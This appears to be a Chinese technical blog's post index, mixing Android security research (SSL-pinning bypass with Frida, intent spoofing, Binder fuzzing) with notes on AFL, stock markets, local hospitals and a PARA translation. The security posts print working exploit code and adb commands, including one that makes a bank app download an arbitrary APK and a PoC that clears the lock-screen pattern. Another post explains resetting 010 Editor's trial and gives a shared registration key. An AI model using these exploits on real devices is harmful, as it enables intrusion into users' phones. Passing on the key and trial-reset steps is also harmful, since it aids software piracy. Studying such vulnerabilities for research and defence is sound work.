123456789101112131415161718192021frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -F ____ / _ | Frida 14.2.18 - A world-class dynamic instrumentation toolkit | (_| | &gt; _ | Commands: /_/ |_| help -&gt; Displays the help system . . . . object? -&gt; Display information about 'object' . . . . exit/quit -&gt; Exit . . . . . . . . More info at https://frida.re/docs/home/[.] Cert Pinning Bypass/Re-Pinning[+] Loading our CA...[o] Our CA Info: O=mitmproxy, CN=mitmproxy[+] Creating a KeyStore for our CA...[+] Creating a TrustManager that trusts the CA in our KeyStore...[+] Our TrustManager is ready...[+] Hijacking SSLContext methods now...[-] Waiting for the app to invoke SSLContext.init()...[Pixel 2::智能生活]-&gt; exit 其中 -F 参数 attach to frontmost application 不用指定 pid 或者包名，非常方便。 使用 mitmweb 查看报文执行 mitmweb -p 8080 后可以用浏览器访问 http://127.0.0.1:8081/ 查看报文，如果需要共享报文数据可以使用mitmweb 界面提供的 save 功能，会保存成一个 flow 文件，后面使用 mitmweb 界面提供的 open 打开报文文件即可展示报文详细信息。 参考资料https://shunix.com/ssl-pinning/","link":"/cn/Android_SSL_Pinning/"},{"title":"Intent Spoofing 攻击","text":"0. Android的安全模型 application sandbox selinux permissions application signing 正是因为Application sandbox的存在，App进程之间是相互隔离的。有下面一个场景一个App需要调用weixin来分享内容，如何处理？这就需要用到intent，告诉Android系统你的意图是什么，Android系统将调用相应的处理程序来处理。 Intent 是一个将要执行的动作的抽象的描述，一般来说是作为参数来使用，由Intent来协助完成android各个组件之间的通讯。比如说调用startActivity()来启动一个activity,或者由broadcaseIntent()来传递给所有感兴趣的BroadcaseReceiver, 再或者由startService()/bindservice()来启动一个后台的service.所以可以看出来，intent主要是用来启动其他的activity 或者service，所以可以将intent理解成activity之间的粘合剂。 1. IntentIntent有两种类型，Explicit Intent 和 Implicit Intent。 Explicit Intent 明确指定Intent的名字(全类名)，当你使用Explicit Intent 启动Activity或者启动 Service，Android系统会立即启动Intent对象所指定的Component。 Implicit Intent 指定Intent的ACTION，当你使用Implicit Intent，Android系统将通过比较 App Manifest文件中所定义的Intent filter来启动符合要求的Component。如果只有一个Intentfilter被匹配成功，系统将启动对应的Component，并递送Intent Object。如果有多个intentfilter是兼容的，系统将显示一个dialog，用户可以选择需要使用的component 下面用代码说明这两种Intent Explicit Intent 123Intent downloadIntent = new Intent(this, DownloadService.class);downloadIntent.setData(Uri.parse(fileUrl));startService(downloadIntent); Implicit Intent 123456789Intent sendIntent = new Intent();sendIntent.setAction(Intent.ACTION_SEND);sendIntent.putExtra(Intent.EXTRA_TEXT, textMessage);sendIntent.setType(HTTP.PLAIN_TEXT_TYPE); // &quot;text/plain&quot; MIME type// Verify that the intent will resolve to an activityif (sendIntent.resolveActivity(getPackageManager()) != null) { startActivity(sendIntent);} 2. Intent SpoofingAndroid Intent Spoofing是一个比较常见的问题。如果Android组件(component,servicereceiver)是导出的话(exported=true)，恶意程序可以使用 Explicit Intent向这个组件发送Intent，Android无法识别这个 Intent是谁发送的，将会正常的执行请求的操作。 从上面的描述中可以发现，关键是 component要是导出的，而Android的component的导出的默认值并不是固定的，这点我们从Google提供的文档可以证实。 http://developer.android.com/guide/topics/manifest/receiver-element.html android:exported 12345678910111213141516Whether or not the broadcast receiver can receive messages from sources outsideits application — &quot;true&quot; if it can, and &quot;false&quot; if not. If &quot;false&quot;, the only messages the broadcast receiver can receive are those sent by components of the same application or applications with the same user ID.The default value depends on whether the broadcast receiver contains intent filters.The absence of any filters means that it can be invoked only by Intent objects that specify its exact class name. This implies that the receiver is intended only for application-internal use (since others would not normally know the class name). So in this case, the default value is &quot;false&quot;. On the other hand, the presence of at least one filter implies that the broadcast receiver is intended to receive intents broadcast by the system or other applications, so the default value is &quot;true&quot;.This attribute is not the only way to limit a broadcast receiver's external exposure.You can also use a permission to limit the external entities that can send it messages (see the permission attribute). 我写了一个程序测试具体的情况。 AndroidManifest.xml 12345678&lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot; /&gt;&lt;receiver android:name=&quot;.PhoneReceiver&quot; android:enabled=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;com.nsfocus.test&quot; /&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 测试程序注册了一个Receiver，这个Receiver处理 com.nsfocus.test Implicit Intent包含了一个Intent Filter，在AndroidManifest.xml中没有明确声明这个reciever是导出的还是未导出的。 receiver 的代码为 12345 public void onReceive(Context context, Intent intent) { Toast.makeText(context, &quot;Get it&quot;, Toast.LENGTH_LONG).show(); }} 使用adb shell中发送广播 1adb shell am broadcast -a com.nsfocus.test 可以看到Get it 的提示信息，也就是说 component 处理 Implicit Intent 时默认是exported=true 的，这就是问题的关键。 下面修改代码改成 exported=false，看看是什么情况。 AndroidManifest.xml 12345678&lt;receiver android:name=&quot;.PhoneReceiver&quot; android:enabled=&quot;true&quot; android:exported=&quot;false&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;com.nsfocus.test&quot; /&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; receiver 照样可以收到，显示”Get it”，所以在receiver里做校验是非常有必要的。因为无论exported如何设置，只要里面包含了Intent Filter 就可以接受到消息。 2.1 一般解决方案如果设置了 intent-filter，可以利用 android:permission 属性来要求广播发送者所需要具有的必要权限，这样才不会产生权限绕过问题。 比如我在.PhoneReceiver里要实现收短信的功能，就应该写成这样 123456789&lt;receiver android:name=&quot;.PhoneReceiver&quot; android:enabled=&quot;true&quot; android:permission=&quot;android.permission.SMS_RECEIVED&quot; android:exported=&quot;false&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.PHONE_STATE&quot; /&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 这样广播发送者需要声明** android.permission.SMS_RECEIVED **权限，不然.PhoneReceiver就不处理了，修改后测试发现确实收不到了。 2.2 漏洞实例启用手机GPS12345Intent intent = new Intent();intent.setClassName(&quot;com.android.settings&quot;, &quot;com.android.settings.widget.SettingsAppWidgetProvider&quot;);intent.addCategory(&quot;android.intent.category.ALTERNATIVE&quot;);intent.setData(Uri.parse(&quot;custom:3&quot;));mContext.sendBroadcast(intent); 上面这个例子是通过广播的方法进行攻击的，攻击的目标是com.android.settings.widgetAndroid并未提供操作GPS的API，但是通过上面这个方法却可以控制GPS的开关。而且更有趣的是我们并没有声明任何和Location相关的权限 :) widget是Android提供的桌面的小插件，就和KDE的之类的插件类似，可以通过Google提供的API来开发。 custom:3 这个字符串比较诡异，其实可以在Android 的代码中找到 /com/android/settings/widget/SettingsAppWidgetProvider.java 12345private static final int BUTTON_WIFI = 0;private static final int BUTTON_BRIGHTNESS = 1;private static final int BUTTON_SYNC = 2;private static final int BUTTON_LOCATION = 3;private static final int BUTTON_BLUETOOTH = 4; 123456789101112131415161718192021222324252627282930313233343536@Overridepublic void onReceive(Context context, Intent intent) { super.onReceive(context, intent); String action = intent.getAction(); if (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action)) { sWifiState.onActualStateChange(context, intent); } else if (BluetoothAdapter.ACTION_STATE_CHANGED.equals(action)) { sBluetoothState.onActualStateChange(context, intent); } else if (LocationManager.MODE_CHANGED_ACTION.equals(action)) { sLocationState.onActualStateChange(context, intent); } else if (ContentResolver.ACTION_SYNC_CONN_STATUS_CHANGED.equals(action)) { sSyncState.onActualStateChange(context, intent); } else if (intent.hasCategory(Intent.CATEGORY_ALTERNATIVE)) { Uri data = intent.getData(); int buttonId = Integer.parseInt(data.getSchemeSpecificPart()); if (buttonId == BUTTON_WIFI) { sWifiState.toggleState(context); } else if (buttonId == BUTTON_BRIGHTNESS) { toggleBrightness(context); } else if (buttonId == BUTTON_SYNC) { sSyncState.toggleState(context); } else if (buttonId == BUTTON_LOCATION) { sLocationState.toggleState(context); } else if (buttonId == BUTTON_BLUETOOTH) { sBluetoothState.toggleState(context); } } else { // Don't fall-through to updating the widget. The Intent // was something unrelated or that our super class took // care of. return; } // State changes fall through updateWidget(context);} 可以发现无法对广播的发送者进行校验，收到广播就执行相关的动作。 江苏银行手机银行下载安装任意apk（可木马）http://www.wooyun.org/bugs/wooyun-2010-0104992 AndroidManifest.xml 12345&lt;service android:name=&quot;.UpdateService&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;cn.jsb.china.UpdateService&quot; /&gt; &lt;/intent-filter&gt;&lt;/service&gt; UpdateService.java 123456789101112131415161718192021222324252627282930313233343536373839public int onStartCommand(Intent arg6, int arg7, int arg8) { Bundle v0 = arg6.getExtras(); if(v0 != null) { this.a = v0.getBoolean(&quot;isupdate&quot;); } this.b = arg6.getStringExtra(&quot;url&quot;); this.c = this.getSystemService(&quot;notification&quot;); this.d = new Notification(); this.d.icon = 17301633; if(this.a) { this.i = new RemoteViews(this.getPackageName(), 2130903048); this.d.tickerText = &quot;正在下载江苏银行&quot;; } else { this.i = new RemoteViews(this.getPackageName(), 2130903043); this.d.tickerText = &quot;正在下载手机证券&quot;; } this.d.when = System.currentTimeMillis(); this.d.flags |= 2; this.d.flags |= 32; this.d.defaults = 4; this.d.contentView = this.i; this.d.setLatestEventInfo(((Context)this), &quot;&quot;, &quot;&quot;, PendingIntent.getActivity(((Context)this), 0, arg6, 0)); this.c.notify(this.j, this.d); this.g = new jn(this, Looper.myLooper(), ((Context)this)); this.g.sendMessage(this.g.obtainMessage(3, Integer.valueOf(0))); new jm(this, this.b).start(); return super.onStartCommand(arg6, arg7, arg8);} 利用代码 1am startservice -n cn.jsb.china/.UpdateService --ez isupdate true --es url http://192.168.102.204/mijian_2.5.1_272.apk 美团外卖客户端本地拒绝服务漏洞http://www.wooyun.org/bugs/wooyun-2010-0106580 利用代码 1adb shell am startservice -n com.sankuai.meituan.takeoutnew/com.sankuai.mtmp.service.MtmpService 航旅纵横手势锁轻易绕过及其它漏洞http://www.wooyun.org/bugs/wooyun-2010-0111692 利用代码 1am start com.umetrip.android.msky.app/com.umetrip.android.msky.activity.MainActivity 参考链接 [1] Intent Spoofing Vulnerability in Android Apps – OWASP Top 10","link":"/cn/android_intent_base_attack/"},{"title":"Android Binder Fuzzing 的一些思路","text":"1. binder 简介Android安全模型的一个关键部分是每一个应用程序都被赋予一个唯一的 Linux 用户 ID 和组 ID，运行在自己的进程和 Dalvik 虚拟机里。在应用程序安装的过程中，Android系统设备上创建一个专门的目录（文件夹），用于存储此应用程序的数据，并且仅允许应用程序利用Linux 用户 ID 和组 ID 的相应访问权限对这些数据进行访问。此外，此应用程序的 Dalvik 虚拟机使用应用程序的用户 ID 运行在自己的进程中。这些关键的机制在操作系统层面上强制数据安全，因为应用程序之间不共享内存、访问权限及磁盘存储。应用程序只能在它们自己的 Dalvik 虚拟机范围内访问内存和数据。 1234567891011121314151617$ ps...u0_a16 2757 882 2574956 116944 SyS_epoll+ 0 S com.google.android.gms.persistentu0_a128 2774 883 1939084 87720 SyS_epoll+ 0 S com.ss.android.article.news:pushu0_a16 2850 882 2322980 46592 SyS_epoll+ 0 S com.google.process.gappsu0_a128 2887 883 2190568 181868 SyS_epoll+ 0 S com.ss.android.article.newsu0_a37 2900 882 2430908 58316 SyS_epoll+ 0 S com.google.android.googlequicksearchbox:interactornfc 2918 882 2351828 62356 SyS_epoll+ 0 S com.android.nfcu0_a45 2930 882 2309884 43576 SyS_epoll+ 0 S se.dirac.acsradio 2945 882 2313144 45592 SyS_epoll+ 0 S net.oneplus.pushu0_a0 2956 882 2304600 36360 SyS_epoll+ 0 S com.oneplussystem 2967 882 2307276 38088 SyS_epoll+ 0 S com.fingerprints.serviceextsystem 2985 882 2309992 42044 SyS_epoll+ 0 S com.oneplus.opbugreportliteu0_a142 2997 882 2370296 93324 SyS_epoll+ 0 S com.oneplus.aodu0_a16 3018 882 2731976 165828 SyS_epoll+ 0 S com.google.android.gms... Android app 是由 Activity、Service、Broadcast 和 Content Provider 四大组件构成，而这些组件可能运行在同一进程中，也可能运行在不同的进程中，而像 PowerManagerService等重要服务都运行在核心进程 system_server 里，所以 Android 系统必须实现一个靠谱的进程间通信机制 （IPC）。Android系统基于 Linux 开发，Linux 中有很多进程间通信的方法，如 Signal、Pipe、Socket、Share Memeory、Semaphore， 但是 Android 系统并没有使用这些进程间通信的方法，而是基于 OpenBinder 自己开发了一套进程通信的方法，Binder 是 Android 系统 IPC 通信的机制。 123456789101112131415161718192021$ adb shell ps | grep system_serversystem 63 32 120160 35408 ffffffff afd0c738 S system_server$ adb logcat | grep &quot;63)&quot;...D/PowerManagerService( 63): bootCompletedI/TelephonyRegistry( 63): notifyServiceState: 0 home Android Android 310260 UMTS CSS not supp...I/TelephonyRegistry( 63): notifyDataConnection: state=0 isDataConnectivityPossible=false reason=nullinterfaceName=null networkType=3I/SearchManagerService( 63): Building list of searchable activitiesI/WifiService( 63): WifiService trying to setNumAllowed to 11 with persist set to trueI/ActivityManager( 63): Config changed: { scale=1.0 imsi=310/260 loc=en_US touch=3 keys=2/1/2 nav=3/1 ...I/TelephonyRegistry( 63): notifyMessageWaitingChanged: falseI/TelephonyRegistry( 63): notifyCallForwardingChanged: falseI/TelephonyRegistry( 63): notifyDataConnection: state=1 isDataConnectivityPossible=true reason=simL...I/TelephonyRegistry( 63): notifyDataConnection: state=2 isDataConnectivityPossible=true reason=simL...D/Tethering( 63): MasterInitialState.processMessage what=3I/ActivityManager( 63): Start proc android.process.media for broadcastcom.android.providers.downloads/.DownloadReceiver: pid=223 uid=10002 gids={1015, 2001, 3003}I/RecoverySystem( 63): No recovery log fileW/WindowManager( 63): App freeze timeout expired. 2. Binder 架构Binder 使用 CS （Client/Server） 模型，提供服务的进程是 Server 进程，访问服务的是 Client 进程。从代码实现的角度看，Binder架构采用的是分层架构设计,大致上可以分为 Java 层， Java IPC 层，Native IPC 层， Linux 内核层。 从组件的视角来看，Binder 包含了 Client、Server、ServiceManger 和 binder 驱动， ServiceManager 用于管理系统中的各种服务，见下图。 图中虚线的箭头为跨进程的进程间通信，必须使用 Android IPC binder 机制。 3. 为什么要 fuzz binder把 Binder 作为一个目标的原因比较明显的，因为在 Android 的安全模型中，Binder 是一个重要的安全边界。在一个低权限的 app 里面构造的数据，会在高权限的进程里面使用，如果发生问题，就是一个明显的权限提升漏洞。另外数据在处理的过程中，有 flatten 和 unflatten 两个步骤，这些步骤就像我们平时说的编码和解码一样非常容易出问题。 存在一些非常经典的漏洞， 例如 CVE-2014-7911 该漏洞允许恶意应用从普通应用权限提权到system用户执行命令。 4. 实现在每个层面都可以实现相关代码进行 Fuzz， 下面分析在每个层面的具体实现。 4.1 直接调用 ioctl实现 Binder fuzzer 的方法有好几种，最直接的想法当然就是直接调用 ioctl 系统调用。 其中 fd 可以通过打开 /dev/binder 设备文件获得，难点在 binder_write_read 数据结构的构造。 1int fd = open(&quot;/dev/binder&quot;, O_RDWR); 4.2 Native 层在 Native 层，利用 IBinder 可以将问题简化， 看上面的结构图，通过阅读 Android 源码， 可以看出我们可以利用 IBinder的 transcat 来调用相应的Binder 接口函数，参考： https://android.googlesource.com/platform/frameworks/native/+/master/cmds/service/service.cpp 调用 IBinder 的 transact 需要自己填充 parcel 数据， 可以从下面的示意理解大致的含义： code 为 Binder 调用接口的功能号， parcel 中需要指定调用那个接口。 123456789101112131415161718192021222324252627282930313233343536373839String16 get_interface_name(sp&lt;IBinder&gt; service){ if (service != NULL) { Parcel data, reply; status_t err = service-&gt;transact(IBinder::INTERFACE_TRANSACTION, data, &amp;reply); if (err == NO_ERROR) { return reply.readString16(); } } return String16();}int main(int argc, char** argv).{ sp&lt;IServiceManager&gt; sm = defaultServiceManager(); Vector&lt;String16&gt; services = sm-&gt;listServices(); for (uint32_t i = 0; i &lt; services.size(); i++) { String16 name = services[i]; sp&lt;IBinder&gt; service = sm-&gt;checkService(name); String16 ifName = get_interface_name(service); if (service != NULL &amp;&amp; ifName.size() &gt; 0) { for (uint32_t code = 0; code &lt;= 100; code++) { aout &lt;&lt; &quot;ifName: &quot; &lt;&lt; ifName &lt;&lt; &quot;, code: &quot; &lt;&lt; code &lt;&lt; endl; Parcel data, reply; data.writeInterfaceToken(ifName); for (uint32_t i = 0; i &lt; random() % 800; i++ ) { uint32_t a = random(); aout &lt;&lt; &quot;data[&quot; &lt;&lt; i &lt;&lt; &quot;]: &quot; &lt;&lt; a &lt;&lt; endl; data.writeInt32(a); } service-&gt;transact(code, data, &amp;reply, 1); } } } return 0;} 4.3 Java 应用层到了 Java 应用层，我们可以获得的信息就丰富了，可以获得详细的信息。 1) 获取所有运行的services1234567891011121314public String[] getServices() { String[] services = null; try { services = (String[]) Class.forName(&quot;android.os.ServiceManager&quot;) .getDeclaredMethod(&quot;listServices&quot;).invoke(null); } catch (ClassCastException e) { } catch (ClassNotFoundException e) { } catch (NoSuchMethodException e) { } catch (InvocationTargetException e) { } catch (IllegalAccessException e) { } return services;} 2) 获得对应服务的IBinder 对象1234567891011121314public IBinder getIBinder(String service) { IBinder serviceBinder = null; try { serviceBinder = (IBinder) Class.forName(&quot;android.os.ServiceManager&quot;) .getDeclaredMethod(&quot;getService&quot;, String.class).invoke(null, service); } catch (ClassCastException e) { } catch (ClassNotFoundException e) { } catch (NoSuchMethodException e) { } catch (InvocationTargetException e) { } catch (IllegalAccessException e) { } return serviceBinder;} 3) 利用反射获取对应接口的所有code123456789101112131415161718192021public HashMap&lt;String,Integer&gt; getBinderCode(String interfaceDescriptor) { HashMap&lt;String, Integer&gt; codes = new HashMap&lt;&gt;(); if (interfaceDescriptor == null) return codes; try { Class&lt;?&gt; cStub = Class .forName(interfaceDescriptor + &quot;$Stub&quot;); Field[] f = cStub.getDeclaredFields(); for (Field field : f) { field.setAccessible(true); String k= field.toString().split(&quot;\\\\$Stub\\\\.&quot;)[1]; if (k.contains(&quot;TRANSACTION&quot;)) codes.put(k, (int)field.get(this)); } } catch (Exception e) { } return codes;} 4) 利用反射获取对应接口所有调用的参数类型binder call 的参数类型 1234567891011121314151617181920212223242526272829303132333435363738394041public HashMap&lt;String, List&lt;String&gt;&gt; getBinderCallParameter(String interfaceDescriptor, HashMap&lt;String, Integer&gt; codes) { HashMap&lt;String, List&lt;String&gt;&gt; ret = new HashMap(); if (interfaceDescriptor == null) return ret; try { Class&lt;?&gt; cStub = Class .forName(interfaceDescriptor + &quot;$Stub$Proxy&quot;); Method[] m = cStub.getDeclaredMethods(); for (Method method : m) { int func_code = 0; List&lt;String&gt; func_parameter = new ArrayList&lt;&gt;(); method.setAccessible(true); String func_name = method.toString().split(&quot;\\\\$Stub\\\\$Proxy\\\\.&quot;)[1]; func_parameter.add(func_name); for (String key : codes.keySet()) { if (func_name.contains(key.substring(&quot;TRANSACTION_&quot;.length()))) func_code = codes.get(key); } if (func_code == 0) continue; Class&lt;?&gt;[] ParameterTypes = method.getParameterTypes(); for (int k=0; k &lt; ParameterTypes.length; k++) { func_parameter.add(ParameterTypes[k].toString()); } ret.put(Integer.toString(func_code), func_parameter); } } catch (Exception e) { } return ret;} 5）Binder 调用123456789101112131415161718192021public static IBinder getIBinder(String service) { IBinder serviceBinder = null; try { serviceBinder = (IBinder) Class.forName(&quot;android.os.ServiceManager&quot;) .getDeclaredMethod(&quot;getService&quot;, String.class).invoke(null, service); } catch (ClassCastException e) { } catch (ClassNotFoundException e) { } catch (NoSuchMethodException e) { } catch (InvocationTargetException e) { } catch (IllegalAccessException e) { } return serviceBinder;}public void fuzz (int code, String Service) { Parcel data = Parcel.obtain(); Parcel reply = Parcel.obtain(); IBinder serviceBinder = BinderInfo.getIBinder(service); serviceBinder.transact(code, data, reply, 0);} 上面的几个步骤已经全部java 代码实现，可行。 5. 实现方法的分析于比较ioctl 的方法过于底层，需要实现的代码很多，而 java 应用层的代码由于权限原因，经常会遇到没有权限的情况。所以使用 Native 层的方法是合适的，在Root 的Android 机器上运行代码，可以解决权限问题。而 Java 应用层的代码利用反射可以获取到每个接口的详细信息，根据获取到的信息指导 Native 层 fuzz 程序的后续变异，应该是比较理想的方法。 6. Fuzz 数据的生成可以考虑移植 radasma 到 Android 平台 1234567891011$ git clone https://github.com/anestisb/radamsa-android.git$ cd radamsa-android$ export PATH=$PATH:NDK_PATH$ ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./jni/Android.mk \\ APP_PLATFORM=android-24 APP_ABI=armeabi-v7a \\ NDK_TOOLCHAIN=arm-linux-androideabi-4.9[armeabi-v7a] Compile thumb : radamsa &lt;= radamsa.c[armeabi-v7a] Executable : radamsa[armeabi-v7a] Install : radamsa =&gt; libs/armeabi-v7a/radamsa 6.1 更新 radamsa-androidgithub 上移植的radamsa 已经比较古老 (0.4), 可以直接将最新版(0.6a)的radamsa 移植到 Android上。方法比较简单，在原始的 radamsa 中有一个 radamsa.c 将这个文件替换radamsa-android/jni 目录下的 radamsa.c 然后在文件中添加下面代码， 重新编译即可： 123456#ifdef ANDROID#include &lt;arpa/inet.h&gt;#ifndef WIFCONTINUED#define WIFCONTINUED(stat) 0#endif#endif 7. Fuzz 出来的一些漏洞1） htc m8 零权限打开闪光灯12345678910IBinder serviceBinder = getIBinder(&quot;media.camera&quot;);Parcel data1 = Parcel.obtain();Parcel reply1 = Parcel.obtain();try { data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor()); data1.writeByteArray(new byte[1024]); serviceBinder.transact(8, data1, reply1, 0);} catch (Exception e) {} 2） Android 6.0.1 MOB3OM 手势密码清除漏洞12345678910111213141516171819202122232425262728public void attack() { IBinder serviceBinder = getIBinder(&quot;lock_settings&quot;); Parcel data1 = Parcel.obtain(); Parcel reply1 = Parcel.obtain(); try { data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor()); data1.writeByteArray(new byte[255]); serviceBinder.transact(7, data1, reply1, 0); } catch (RemoteException e) {}}public IBinder getIBinder(String service) { IBinder serviceBinder = null; try { serviceBinder = (IBinder) Class.forName(&quot;android.os.ServiceManager&quot;) .getDeclaredMethod(&quot;getService&quot;, String.class).invoke(null, service); } catch (ClassCastException e) { } catch (ClassNotFoundException e) { } catch (NoSuchMethodException e) { } catch (InvocationTargetException e) { } catch (IllegalAccessException e) { } return serviceBinder;} 在Android 6.0.1 MOB3OM 之前的一些版本中, 未在setLockPattern 中做权限检查,导致apk 不需要任何权限就可以将手势密码清除. 这个问题已经修复 author Jim Miller jaggies@google.com Wed Apr 13 16:35:36 2016 -0700 https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0 但是考虑到Android 的碎片化问题, 估计在一些手机中将存在这个问题. 参考资料 Fuzzing Android System Services by Binder Call to Escalate Privilege BitUnmap: Attacking Android Ashmem Android’s Binder – in depth","link":"/cn/Android_binder_fuzzing/"},{"title":"afl-fuzz 框架","text":"afl-fuzz 的整体架构，新手理解起来还是比较费劲，网络上发现一张图觉得不错，放上来大家看看，感谢原作者。","link":"/cn/afl/"},{"title":"Dissecting American Fuzzy Lop A FuzzBench Evaluation 要点","text":"paper: https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf 两个实验的结论 (主要基于 FuzzBench) Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance of each variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggests that users should include a variant without hitcounts when doing parallel or ensemble fuzzing like OSS-Fuzz. The conclusion we can draw from this experiment is that it would be a mistake to underestimate the impact of the novelty search. In particular, researchers proposing new approaches that also modify this aspect should care-fully evaluate – in isolation – the benefit of a different mechanism to decide if an input is interesting, as AFL’s novelty search provides a strong baseline. 论文中计划要评估的 afl-fuzz 的一些技术 Hitcounts: Hitcounts are adopted by other fuzzers to-day, but AFL was the first to introduce this concept.Despite its wide adoption, the impact of this optimization (overplain edge coverage) has never been measured in isolation on a large set of targets. Novelty search vs. maximization of a fitness: While AFL considers every new discovered hitcount as interesting, both other early fuzzing solutions and more recent tools instead only consider testcases that maximize a given metricas interesting. For instance, VUZZER uses the sum of all the weights of the executed basic blocks. In this experiment, we benchmark the AFL approach versusa fitness maximization and the combination of the two ap-proaches, as proposed by VUZZER We expect the novelty search to outperforms both of the competing algorithms, Corpus culling: The prioritization of the small and fast testcases in the AFL corpus selection algorithm trades speed with the fuzzing of more complex testcases that often corresponds to complex program states In this experiment, we want to assess the difference in using the AFL corpus culling mechanism versus using the entire corpus. We expect faster growth in coverage over time and,potentially, more bugs triggered in the same time window Score calculation: The performance score used to cal-culate how many times to mutate and execute the input in the havoc, and splice stages are derived from many variables,mainly testcase size and execution time In this experiment, we want to measure the delta between the AFL solution and the baseline, represented by a constantand a random score Corpus scheduling: The FIFO policy used by AFL is only one of the possible policies that a fuzzer can adopt to select the next testcase Thus, we evaluate AFL versus a modified version that implements the baseline, random selection, and the opposite approach, a LIFO scheduler. Splicing as stage vs. splicing as mutation: Splicing refers to the operation that merges two different testcases into a new one We modified the AFL codebase to implement splicing as a mutation operator to compare the two. Trimming: Trimming the testcases allows the fuzzer to reduce the size of the input files and consequently give priority to small inputs, under the assumptions that large inputs introduce a slowdown in the execution and the mutations would be less likely to modify an important portion of the binary structure Despite the fact that this algorithm can bring the two important benefits described above, we argue that reducing the size of the testcases could lead to lose state coverage.Additionally, the trimming phase could become a bottleneck for slow targets Therefore, in our evaluation we plan tocompare the default version of AFL against a modified one,where we disabled trimming Collisions: As explained in section III-F the AFL ap-proach to instrument the source code of the target programs consists of assigning an identifier for each basic block at compile-time. We want to benchmark this feature as the collision-free variant is simpler than the original implementation with pc-guard, raising the question why random identifiers are used in AFL","link":"/cn/afl-fuzz1/"},{"title":"关于A股变盘的假期效应思考","text":"沉浮 A股多年，发现一个比较重要的规律，A 股变盘的时间节点大多发生在重大节假日期间，分别举例如下： 「1」重大节日 （包括阳历和农历： 劳动节，国庆节，中秋节，端午节，过年 等） 「2」周一/周五 「3」月初/月末 有人总结出 A 股变盘时间节点和农历的 24 节气相关，每个节气的时间间隔大致在 15 到 16 天左右，这条规律其实和上面的 「1」 说法是一致的。 思考其背后的原因，平时交易日都是连续的中间无间断，大家的交易思路和看法也比较容易连续一致。每逢重大节日，或者月初月末，往往都是放假休息的时间，外加期间各种信息的输入量比平时大很多，这样容易有思维波动。重大节日后，主力一带节奏，容易对大家的思维进行强化，分歧转一致后，就真的变盘了。 A股还有个月初，月末效应，月初赚钱，月末亏钱，比较奇怪，可能和基金经理的月初建仓和月末考核相关，这条规律几乎是对称的，如果月末没有大跌，月初基本就没有大赚效应。 后面发现居然有一个股票技术分析流派叫季节派。（季节理论 Season Theory）","link":"/cn/a_change/"},{"title":"紫竹桥附近看病情况","text":"作为一个长期在帝都紫竹桥混吃的中年大叔，经常遇到需要看病的情况，主要需求有两个 （大人看病，小孩看病）。 总结附近医院情况，个人理解，供参考： 466: 缺点：没有儿科，巨贵，感觉医生喜欢过度治疗，据说一些科室已被私人承包，媳妇和自己都被坑过。优点：离紫竹桥距离近，三甲，人通常比较少，小病，偷懒的时候可以过去。据说牙科不错，但是我没有去过。 304: 缺点：信息化程度相对较弱，但是看病流程梳理得不错。优点：三甲，有儿科，对小儿看病有一定优待。医生水平不错，小孩在这看过几次，治疗效果不错。 现在304 改名为 解放军总医院第四医学中心，儿科的实力比以往有较大提升。 四季青： 缺点：二级医院，儿科有的医生感觉不太专业。优点：挂号方便，有儿科，医院较大。 北方医院： 缺点：二级医院， 医院较小。优点：离紫竹桥距离近，有保健科，小孩打预防针不错。 空总： 在这个医院多个科室看过病，家人还在这做过微创手术。 缺点：挂号有点难，人多，儿科水平一般。优点：三甲，皮肤科北京有名，各科室水平比较均衡。信息化程度高，看病挺方便。 海总： 这个医院我没有去过，距离稍远。","link":"/cn/304/"},{"title":"010editor 保持试用","text":"软件介绍010Editor是一款快速且强大的十六进制编辑器。用来编辑二进制文件。有一个友好易于使用的界面，无限次的undo和redo操作。另外还可以打印十六进制的字节或者以书签的方式标出某些重要的字节。支持二进制模板（binary template）系统。 保持试用国外软件很多时候相当厚道了，试用基本是全功能，轻微延时和不能自动更新二进制模板，就日常使用来说基本是完全够用了。 关键文件为 ~/.config/SweetScape/010 Editor.ini，无法使用的时侯可以把这个文件清空，将恢复30天试用状态，或者简单粗暴的将文件设置为只读。 1chmod 444 &quot;010 Editor.ini&quot; 用IDA逆向的时侯没有发现这个文件比较奇怪。这个文件是 是使用strace命令发现的，strace命令支持 -e 的过滤参数将有效减少输出，一般来说看strace日志文件可以从最后往前看。 1strace -e trace=file ./010editor 从代码上看有使用网络验证需要在hosts文件中屏敝两个网站， 可以减少一些不必要的麻烦。 12127.0.0.1 www.sweetscape.com127.0.0.1 www.010editor.com 我现在已经是注册用户了，在很长的一段时间内，这方法是管用的，做个备忘。 scz 补充： 之前github上的那个开源keygen还能用，或者就用 12user userpass 3470D4AC7CEFACD9297A 只是hosts更改可能不够，windows上用wf.msc阻止010 Editor联网，Linux好像没有简单办法阻止特定进程联网，只能变相利用uid、gid达成目的。 How to block internet access to certain programs on Linuxhttps://serverfault.com/questions/550276/how-to-block-internet-access-to-certain-programs-on-linux https://unix.stackexchange.com/questions/104830/block-specific-application-with-iptables","link":"/cn/010editor/"},{"title":"(译文) 一秒钟内整理数字生活的系统 by claude","text":"The PARA Method: The Simple System for Organizing Your Digital Life in Secondshttps://fortelabs.com/blog/para 想象一下完美的组织系统。一个系统会告诉你如何确切地把生活中的每一件信息-每份文件、笔记、日程、大纲和研究的碎片-放在哪里,以及之后如何轻松地找到它们。 这样的系统需要非常简单易用,也非常容易维护。毕竟,只有最简单、最轻松的习惯能长期坚持。 